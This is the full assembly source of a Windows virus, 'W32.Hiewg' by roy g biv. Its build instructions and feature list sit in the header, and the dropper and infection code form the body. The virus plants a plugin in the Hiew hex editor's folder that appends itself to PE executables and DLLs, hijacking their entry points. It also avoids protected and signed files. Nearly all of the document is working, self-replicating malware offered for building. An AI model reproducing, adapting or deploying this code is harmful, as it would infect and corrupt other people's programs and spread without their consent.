comment ;)
W32.Hiewg by roy g biv

some of its features:
- parasitic direct-action infector of PE exe/dll (but not looking at suffix)
- infects files when Hiew loads them
- last section appender
- uses CRCs instead of API names
- section attributes are never altered (virus is not self-modifying)
- no infect files with data outside of image (eg self-extractors)
- uses new method to find kernel address (no hard-coded addresses, Windows 7 RC compatible!)

yes, just a W32.Hidan remake that infects Hiew instead of IDA
---

  optimisation tip: Windows appends ".dll" automatically, so this works:
        push "cfs"
        push esp
        call LoadLibraryA
---

to build this thing:
tasm
----
tasm32 /ml /m3 hiewg
tlink32 /B:400000 /x hiewg,,,import32

Virus is not self-modifying, so no need to alter section attributes
---

We're in the middle of a phase transition:
a butterfly flapping its wings at
just the right moment could
cause a storm to happen.
-I'm trying to understand-
I'm at a moment in my life-
I don't know where to flap my wings.
(Danny Hillis)

(;

.386
.model  flat

extern  MessageBoxA:proc
extern  ExitProcess:proc

.data
include hiewg.inc

dropper         label   near
        mov     edx, krncrc_count
        mov     ebx, offset krnnames
        mov     edi, offset krncrcbegin
        call    create_crcs
        mov     edx, 1
        mov     ebx, offset sfcnames
        mov     edi, offset sfccrcbegin
        call    create_crcs
        mov     edx, dllcrc_count
        mov     ebx, offset dllnames
        mov     edi, offset dllcrcbegin
        call    create_crcs
        jmp     hiewg_execode
;-----------------------------------------------------------------------------
;everything before this point is dropper code
;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;virus code begins here
;-----------------------------------------------------------------------------

hiewg_dllcode   proc    near
Hem_Load        proc    near
        push    esi
        push    edi
        xor     ecx, ecx
        mov     esi, dword ptr [esp + 0ch]

gate_ptr1       label   near
        mov     edi, (offset heminfo - offset hiewg_dllcode) + dllsize
        mov     word ptr [edi + (offset gate_ptr1 - offset heminfo) + 3], cx
        add     dword ptr [edi + HEMINFO_TAG.heEntryPoint], edi
        lods    dword ptr [esi]
        lods    dword ptr [esi]
        lods    dword ptr [esi]
        inc     ch
        mov     dword ptr [edi + ecx + (offset gate - offset heminfo) - 100h], eax
        lods    dword ptr [esi]
        mov     dword ptr [edi + ecx + (offset fr + HIEWGATE_NULL.nhemHandle - offset heminfo) - 100h], eax
        mov     dword ptr [edi + ecx + (offset fofw + HIEWGATE_NULL.nhemHandle - offset heminfo) - 100h], eax
        mov     dword ptr [edi + ecx + (offset gd + HIEWGATE_NULL.nhemHandle - offset heminfo) - 100h], eax
        mov     dword ptr [esi + ecx + (HIEWINFO_TAG.hihemInfo - HIEWINFO_TAG.hihemFile) - 100h], edi
        pop     edi
        pop     esi
        xor     eax, eax
        ret     4
Hem_Load        endp

hiewg_entry     proc    near
        pushad
        call    init_findmz

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

krncrcbegin     label   near
        dd      (krncrc_count + 1) dup (0)
krncrcend       label   near

;-----------------------------------------------------------------------------
;get SFC support if available
;-----------------------------------------------------------------------------

check_sfc       label   near
        add     dword ptr [edi + (offset gate_ptr2 - offset check_sfc) + 1], edi
        call    load_sfc
        db      "sfc_os", 0                     ;Windows XP (forwarder chain from sfc.dll)

load_sfc        label   near
        call    dword ptr [esp + krncrcstk.kLoadLibraryA]
        test    eax, eax
        jne     found_sfc
        push    'cfs'                           ;Windows 2000
        push    esp
        call    dword ptr [esp + 4 + krncrcstk.kLoadLibraryA]
        pop     ecx
        test    eax, eax
        je      sfcapi_push

found_sfc       label   near
        xchg    ebx, eax
        call    find_mzhdr

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

sfccrcbegin     label   near
        dd      0, 0
sfccrcend       label   near

sfcapi_pop      label   near
        pop     eax

sfcapi_push     label   near
        push    eax
        enter   0, 0                            ;don't want to track the stack pointer

gate_ptr2       label   near
        mov     esi, offset gate - offset check_sfc
        lods    dword ptr [esi]
        xchg    edi, eax
        lea     eax, dword ptr [esi + offset gd - offset fr]
        push    eax
        call    edi
        mov     dword ptr [esi + (offset gate_ptr2 - offset fr) + 1], offset gate - offset check_sfc
        xchg    ebx, eax
        enter   MAX_PATH * 2, 0
        mov     eax, esp
        push    MAX_PATH
        push    eax
        push    -1
        lea     eax, dword ptr [esi + offset gd.gdfilename - offset fr]
        push    eax
        push    ebx                             ;use default translation
        push    ebx                             ;CP_ANSI
        call    dword ptr [ebp + 0ch + krncrcstk.kMultiByteToWideChar]

;-----------------------------------------------------------------------------
;don't touch protected files
;-----------------------------------------------------------------------------

        mov     ecx, dword ptr [ebp + 0ch + krncrcstk.kSfcIsFileProtected]
        jecxz   leave_sfc
        push    esp
        push    ebx
        call    ecx
        xchg    ecx, eax

leave_sfc       label   near
        leave
        test    ecx, ecx
        jne     skip_file1
        dec     dword ptr [esi + fr.frcallId - offset fr]
        add     dword ptr [esi + fr.frbuffer - offset fr], esi
        push    esi
        call    edi
        mov     eax, dword ptr [esi + offset lfanew - offset fr]
        mov     dword ptr [esi + fr.froffset - offset fr], eax
        add     dword ptr [esi + fr.frbuffer - offset fr], offset peheader - offset lfanew
        mov     byte ptr [esi + fr.frbytes - offset fr], pehdr.pereloc
        push    esi
        call    edi
        mov     eax, dword ptr [esi + (offset peheader - offset fr) + pehdr.pecoff.peflags]

;-----------------------------------------------------------------------------
;IMAGE_FILE_BYTES_REVERSED_* bits are rarely set correctly, so do not test them
;-----------------------------------------------------------------------------

        test    ah, (IMAGE_FILE_SYSTEM or IMAGE_FILE_UP_SYSTEM_ONLY) shr 8
        jne     skip_file2

;-----------------------------------------------------------------------------
;32-bit executable file...
;-----------------------------------------------------------------------------

        and     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
        cmp     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
        jne     skip_file2                     ;cannot use xor+jpo because 0 is also jpe

;-----------------------------------------------------------------------------
;the COFF magic value is not checked because Windows ignores it anyway
;IMAGE_FILE_MACHINE_IA64 machine type is the only reliable way to detect PE32+
;-----------------------------------------------------------------------------

        mov     eax, dword ptr [esi + (offset peheader - offset fr) + pehdr.pesubsys]
        cmp     ax, IMAGE_SUBSYSTEM_WINDOWS_CUI
        jnbe    skip_file2
        cmp     al, IMAGE_SUBSYSTEM_WINDOWS_GUI ;al not ax, because ah is known now to be 0
        jb      skip_file2
        shr     eax, 1eh                        ;test eax, IMAGE_DLLCHARACTERISTICS_WDM_DRIVER shl 10h
        jb      skip_file2

;-----------------------------------------------------------------------------
;avoid files which seem to contain attribute certificates
;because one of those certificates might be a digital signature
;-----------------------------------------------------------------------------

        cmp     dword ptr [esi + (offset peheader - offset fr) + pehdr.pesecurity.dirrva], eax
        jnbe    skip_file2

;-----------------------------------------------------------------------------
;cannot use the NumberOfRvaAndSizes field to calculate the Optional Header size
;the Optional Header can be larger than the offset of the last directory
;remember: even if you have not seen it does not mean that it does not happen :)
;-----------------------------------------------------------------------------

        imul    ax, word ptr [esi + (offset peheader - offset fr) + pehdr.pecoff.pesectcount], size pesect
        movzx   ecx, word ptr [esi + (offset peheader - offset fr) + pehdr.pecoff.peopthdrsize]
        lea     eax, dword ptr [ecx + eax + size pesig + size coffhdr - size pesect]
        add     eax, dword ptr [esi + offset lfanew - offset fr]
        mov     dword ptr [esi + fr.froffset - offset fr], eax
        mov     byte ptr [esi + fr.frbytes - offset fr], size pesect
        push    esi
        call    edi
        mov     eax, dword ptr [esi + (offset peheader - offset fr) + pesect.sectrawsize]
        mov     ecx, eax
        add     eax, dword ptr [esi + (offset peheader - offset fr) + pesect.sectrawaddr]
        cmp     dword ptr [esi + gd.gdfilelength - offset fr], eax
        jne     skip_file2                       ;file contains appended data
        push    eax
        add     ecx, dword ptr [esi + (offset peheader - offset fr) + pesect.sectvirtaddr]
        add     ecx, offset hiewg_execode - offset hiewg_dllcode
        xchg    dword ptr [esi + (offset peheader - offset fr) + pehdr.peentrypoint], ecx
        sub     ecx, offset host_patch - offset hiewg_execode
        sub     ecx, dword ptr [esi + (offset peheader - offset fr) + pehdr.peentrypoint]
        mov     dword ptr [esi + (offset host_patch - offset fr) + 3], ecx
        mov     dword ptr [esi + (offset peheader - offset fr) + pehdr.pechksum], ebx
        mov     bx, offset code_end - offset hiewg_dllcode
        add     dword ptr [esi + (offset peheader - offset fr) + pesect.sectrawsize], ebx
        mov     eax, dword ptr [esi + (offset peheader - offset fr) + pesect.sectrawsize]
        cmp     dword ptr [esi + (offset peheader - offset fr) + pesect.sectvirtsize], eax
        jnb     skip_image
        add     dword ptr [esi + (offset peheader - offset fr) + pesect.sectvirtsize], ebx
        mov     eax, dword ptr [esi + (offset peheader - offset fr) + pehdr.peimagesize]
        add     eax, ebx
        mov     ecx, dword ptr [esi + (offset peheader - offset fr) + pehdr.pesectalign]
        dec     ecx
        add     eax, ecx
        not     ecx
        and     eax, ecx
        mov     dword ptr [esi + (offset peheader - offset fr) + pehdr.peimagesize], eax

skip_image      label   near
        or      byte ptr [esi + (offset peheader - offset fr) + pesect.sectflags + 3], IMAGE_SCN_MEM_EXECUTE shr 18h
        lea     eax, dword ptr [esi + offset fofw - offset fr]
        push    eax
        call    edi
        inc     byte ptr [esi + fr.frcallId - offset fr]
        push    esi
        call    edi
        mov     eax, dword ptr [esi + offset lfanew - offset fr]
        add     eax, pehdr.peentrypoint
        mov     dword ptr [esi + fr.froffset - offset fr], eax
        add     dword ptr [esi + fr.frbuffer - offset fr], pehdr.peentrypoint
        mov     byte ptr [esi + fr.frbytes - offset fr], pehdr.pesubsys - pehdr.peentrypoint
        push    esi
        call    edi
        add     esp, 0ch
        mov     dword ptr [esi + (offset heminfo - offset fr) + HEMINFO_TAG.heEntryPoint], offset hiewg_entry - offset heminfo
        pop     dword ptr [esi + fr.froffset - offset fr]
        mov     word ptr [esi + fr.frbuffer - offset fr], dllsize
        inc     ebx
        mov     word ptr [esi + fr.frbytes - offset fr], bx
        push    esi
        call    edi

skip_file2       label   near
        mov     byte ptr [esi + fr.frcallId - offset fr], HIEWGATE_ID_FILEWRITE
        mov     dword ptr [esi + fr.frbuffer - offset fr], offset lfanew - offset fr
        mov     word ptr [esi + fr.frbytes - offset fr], 4

skip_file1       label   near
        leave
        add     esp, size krncrcstk
        popad
        xor     eax, eax
        ret

init_findmz     label   near
        mov     eax, dword ptr fs:[tebProcessEnvironmentBlock]
        mov     eax, dword ptr [eax + pebLdr]
        mov     esi, dword ptr [eax + ldrInLoadOrderModuleList]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        mov     ebx, dword ptr [eax + mlDllBase]

find_mzhdr      label   near
        mov     esi, dword ptr [ebx + e_lfanew]
        pop     edi

;-----------------------------------------------------------------------------
;parse export table
;-----------------------------------------------------------------------------

        mov     esi, dword ptr [ebx + esi + pehdr.peexport.dirrva]
        lea     esi, dword ptr [ebx + esi + peexp.expadrrva]
        lods    dword ptr [esi]                 ;Export Address Table RVA
        lea     edx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Name Pointer Table RVA
        lea     ecx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Ordinal Table RVA
        lea     ebp, dword ptr [ebx + eax]
        mov     esi, ecx

push_export     label   near
        push    ecx

get_export      label   near
        lods    dword ptr [esi]
        push    ebx
        add     ebx, eax                        ;Name Pointer VA
        or      eax, -1

crc_outer       label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

crc_inner       label   near
        add     eax, eax
        jnb     crc_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

crc_skip        label   near
        loop    crc_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      crc_outer
        pop     ebx
        cmp     dword ptr [edi], eax
        jne     get_export

;-----------------------------------------------------------------------------
;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
;this allows to push addresses onto the stack, and the order is known
;-----------------------------------------------------------------------------

        pop     ecx
        mov     eax, esi
        sub     eax, ecx                        ;Name Pointer Table VA
        shr     eax, 1
        movzx   eax, word ptr [ebp + eax - 2]   ;get export ordinal
        mov     eax, dword ptr [eax * 4 + edx]  ;get export RVA
        add     eax, ebx
        push    eax
        scas    dword ptr [edi]
        cmp     dword ptr [edi], 0
        jne     push_export
        scas    dword ptr [edi]
        jmp     edi
        db      "*4U2NV*"                       ;that is, unless you're reading this
hiewg_entry     endp

hiewg_execode   proc    near
        call    host_patch

host_patch      label   near
        add     dword ptr [esp], offset do_message - offset host_patch
                                                ;replaced dynamically
        pushad
        call    init_findmz

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

dllcrcbegin     label   near
        dd      (dllcrc_count + 1) dup (0)
dllcrcend       label   near

        mov     ebx, esp
        call    skip_dir

hiew_dir        label   near
        db      "c:\hiew\hem", 0                ;no location indicators, guess where Hiew is installed

dlllabel        label   near
        db      '\', dllname, ".hem", 0
        db      0ch - (offset $ - offset dlllabel) dup (0)

dllsize equ     84h
;RLE-based compressed MZ header, PE header
        dd      11111000101100010100011100011100b
        ;       mmmmmz  02mmz  02mz  03mz  03m
        db      'M', 'Z', 0ffh, 0e0h, 'P', 'E', 4ch, 1, 80h, 58h, 6
        dd      00101111111111111110001011100011b
        ;       z  05mmmmmmmmmmmmmmz  02mmmz  03
        db      0eh, 21h, 0bh, 1, 58h, 59h, 83h, 49h, 7ch, 0f0h, 1, 89h, ((offset gate_ptr1 - offset hiewg_dllcode) + 1 + dllsize) and 0ffh, ((offset gate_ptr1 - offset hiewg_dllcode) + 1 + dllsize) shr 8, 0ebh, 0d5h, 1eh
        dd      11111111000101000011000111010111b
        ;       mmmmmmmmz  02mz  01mz  03mz  0bm
        db      'H', 'e', 'm', '_', 'L', 'o', 'a', 'd', 1, 4, 4, 4
        dd      00111100011100111101111010001000b
        ;       z  07mz  03mz  07mz  0fz  08m
        db      40h, 30h, 2, 1
        dd      00111100011000000000000000000000b
        ;       z  07mz  03
        db      dllsize
        dd      0
;decompressed data follow
;       db      'M', 'Z'                ;00 (overload for ordinal base)
;       db      0ffh, 0e0h              ;02    jmp eax (overload for ordinal base)
;       db      'P', 'E'                ;04 00 signature (overload for address count)
;hiewg_expord:
;       db      0, 0                    ;06 02 signature (overload for address count and ordinal)
;       dw      14ch                    ;08 04 machine (overload for name count)
;       dw      0                       ;0a 06 number of sections (overload for name count)
;       dd      offset hiewg_expadr     ;0c 08 date/time stamp (overload for address rva)
;       dd      offset hiewg_expnms     ;10 0c pointer to symbol table (overload for name rva)
;       dd      offset hiewg_expord     ;14 10 number of symbols (overload for ordinal rva)
;       dw      0                       ;18 14 size of optional header
;       dw      210eh                   ;1a 16 characteristics
;       dw      10bh                    ;1c 18 magic
;entrypoint:
;       db      58h                     ;1e 1a major linker (overload for pop eax)
;       db      59h                     ;1f 1b minor linker (overload for pop ecx)
;       db      83h, 49h, 7ch, 0f0h     ;20 1c size of code (overload for or dword ptr [ecx + 7ch], -10h)
;       db      1, 89h
;       dw      offset hiewg_gateptr1 - offset hiewg_dllcode + dllsize
;                                       ;24 20 size of init data (overload for add dword ptr [ecx + 0000xxxx], ecx)
;       db      0, 0, 0ebh, 0d5h        ;28 24 size of uninit data (overload for jmp eax)
;       dd      offset entrypoint       ;2c 28 entry point
;hiewg_expnam:
;       db      'H', 'e', 'm', '_'      ;30 2c base of code (overload for export name)
;       db      'L', 'o', 'a', 'd'      ;34 30 base of data
;       dd      10000h                  ;38 34 image base
;       dd      4                       ;3c 38 section align (overload for lfanew)
;       dd      4                       ;40 3c file align
;       dw      0                       ;44 40 major os
;       dw      0                       ;46 42 minor os
;       dw      0                       ;48 44 major image
;       dw      0                       ;4a 46 minor image
;       dw      4                       ;4c 48 major subsys
;       dw      0                       ;4e 4a minor subsys
;       dd      0                       ;50 4c reserved
;       dd      40h                     ;54 50 size of image
;hiewg_expnms:
;       dd      offset hiewg_expnam     ;58 54 size of headers
;       dd      0                       ;5c 58 checksum
;       dw      2                       ;60 5c subsystem
;       dw      0                       ;62 5e dll characteristics
;       dd      0                       ;64 60 size of stack reserve
;       dd      0                       ;68 64 size of stack commit
;       dd      0                       ;6c 68 size of heap reserve
;       dd      0                       ;70 6c size of heap commit
;       dd      0                       ;74 70 loader flags
;       dd      1                       ;78 74 number of rva and sizes
;       dd      0                       ;7c 78 export (runtime patch to point before image)
;hiewg_expadr:
;       dd      dllsize                 ;80 7c export

skip_dir        label   near
        pop     esi
        mov     edi, offset hiewg_codeend - offset hiewg_dllcode + dllsize + (offset dlllabel - offset hiew_dir) + 0ch
        push    edi
        xor     ebp, ebp                        ;GMEM_FIXED
        push    ebp
        call    dword ptr [ebx + dllcrcstk.dGlobalAlloc]
        push    eax                             ;GlobalFree
        push    ebp                             ;WriteFile
        push    esp                             ;WriteFile
        push    edi                             ;WriteFile
        push    ebp                             ;CreateFileA
        push    ebp                             ;CreateFileA
        push    CREATE_ALWAYS                   ;CreateFileA
        push    ebp                             ;CreateFileA
        push    ebp                             ;CreateFileA
        push    GENERIC_WRITE                   ;CreateFileA
        push    eax                             ;CreateFileA
        lea     ecx, dword ptr [eax + 7fh]
        push    ecx                             ;MoveFileA
        push    eax                             ;MoveFileA
        push    eax                             ;GetFileAttributesA
        push    ebp                             ;SetFileAttributesA
        push    eax                             ;SetFileAttributesA
        push    ecx                             ;DeleteFileA
        push    ecx                             ;GetTempFileNameA
        push    ebp                             ;GetTempFileNameA
        push    esp                             ;GetTempFileNameA
        push    esi                             ;GetTempFileNameA
        xchg    edi, eax
        call    dword ptr [ebx + dllcrcstk.dGetTempFileNameA]
        call    dword ptr [ebx + dllcrcstk.dDeleteFileA]
        push    offset dlllabel - offset hiew_dir
        pop     ecx
        rep     movsb

;-----------------------------------------------------------------------------
;append dll name, assumes name is 0ch bytes long
;-----------------------------------------------------------------------------

        dec     edi
        movs    dword ptr [edi], dword ptr [esi]
        movs    dword ptr [edi], dword ptr [esi]
        movs    dword ptr [edi], dword ptr [esi]

;-----------------------------------------------------------------------------
;anti-anti-file dropper - remove read-only attribute, delete file, rename directory
;-----------------------------------------------------------------------------

        call    dword ptr [ebx + dllcrcstk.dSetFileAttributesA]
        call    dword ptr [ebx + dllcrcstk.dGetFileAttributesA]
        test    al, FILE_ATTRIBUTE_DIRECTORY
        pop     ecx
        pop     eax
        je      skip_move
        push    eax
        push    ecx
        call    dword ptr [ebx + dllcrcstk.dMoveFileA]

skip_move       label   near
        call    dword ptr [ebx + dllcrcstk.dCreateFileA]
        push    edi
        push    ebx
        cdq
        xchg    ebp, eax
        xor     ecx, ecx

;-----------------------------------------------------------------------------
;decompress dll MZ header, PE header, section table, relocation table
;-----------------------------------------------------------------------------

        lods    dword ptr [esi]

copy_bytes      label   near
        movs    byte ptr [edi], byte ptr [esi]

test_bits       label   near
        add     eax, eax
        jb      copy_bytes
        shld    ecx, eax, 4
        shl     eax, 4
        xchg    edx, eax
        rep     stos byte ptr [edi]
        xchg    edx, eax
        jne     test_bits
        lods    dword ptr [esi]
        test    eax, eax
        jne     test_bits
        mov     cx, offset hiewg_codeend - offset hiewg_dllcode
        sub     esi, offset skip_dir - offset hiewg_dllcode
        rep     movs byte ptr [edi], byte ptr [esi]
        pop     ebx
        push    ebp
        call    dword ptr [ebx + dllcrcstk.dWriteFile]
        push    ebp
        call    dword ptr [ebx + dllcrcstk.dCloseHandle]
        call    dword ptr [ebx + dllcrcstk.dGlobalFree]
        add     esp, size dllcrcstk
        popad
        ret

heminfo         HEMINFO_TAG     <size HEMINFO_TAG + 18h + HEM_SHORTNAME_SIZE + HEM_NAME_SIZE + (HEM_ABOUT_SIZE*3), 4, 0, HEM_SDK_VERSION_MAJOR, HEM_SDK_VERSION_MINOR, 0, 0, HEM_FLAG_MODEMASK or HEM_FLAG_PE, 0, offset hiewg_entry - offset heminfo>
                dd      6 dup (0)
                db      HEM_SHORTNAME_SIZE dup (0)
hemname         db      "Hiewg - roy g biv 09/09/09"
                db      (HEM_NAME_SIZE - (offset $ - offset hemname)) dup (0)
                db      HEM_ABOUT_SIZE*3 dup (0)
gate            dd      ?
fr              HIEWGATE_FILEREAD <size HIEWGATE_FILEREAD, HIEWGATE_ID_FILEWRITE, 0, mzhdr.mzlfanew, offset lfanew - offset fr, 4> ;changed to read during exec
fofw            HIEWGATE_FILEOPENFORWRITE <size HIEWGATE_FILEOPENFORWRITE, HIEWGATE_ID_FILEOPENFORWRITE>
gd              HIEWGATE_GETDATA <size HIEWGATE_GETDATA, HIEWGATE_ID_GETDATA>
code_end        equ     (gd + HIEWGATE_GETDATA.gdcallId + 1)

lfanew          dd      ?
peheader        db      0a0h dup (?)
hiewg_execode   endp
hiewg_codeend   label   near

if (offset hiewg_codeend - offset hiewg_dllcode) and 0fffff000h
        err     "code > page, increase image size"
endif
hiewg_dllcode   endp

create_crcs     proc    near
        or      eax, -1

create_outer    label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

create_inner    label   near
        add     eax, eax
        jnb     create_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

create_skip     label   near
        loop    create_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      create_outer
        stos    dword ptr [edi]
        dec     edx
        jne     create_crcs
        ret
create_crcs     endp

do_message      label   near
        xor     ebx, ebx
        push    ebx
        push    offset txttitle
        push    offset txtbody
        push    ebx
        call    MessageBoxA
        push    ebx
        call    ExitProcess

;must be alphabetical order
;API names are not present in replications, only in dropper

krnnames        db      "LoadLibraryA"       , 0
                db      "MultiByteToWideChar", 0

sfcnames        db      "SfcIsFileProtected", 0

dllnames        db      "CloseHandle"       , 0
                db      "CreateFileA"       , 0
                db      "DeleteFileA"       , 0
                db      "GetFileAttributesA", 0
                db      "GetTempFileNameA"  , 0
                db      "GlobalAlloc"       , 0
                db      "GlobalFree"        , 0
                db      "MoveFileA"         , 0
                db      "SetFileAttributesA", 0
                db      "WriteFile"         , 0

dllname         equ     "hiewg"                 ;must be < 7 bytes long else code change

txttitle        db      "Hiewg", 0
txtbody         db      "Now run Hiew, press F11 ;)", 0

.code
        nop
end             dropper
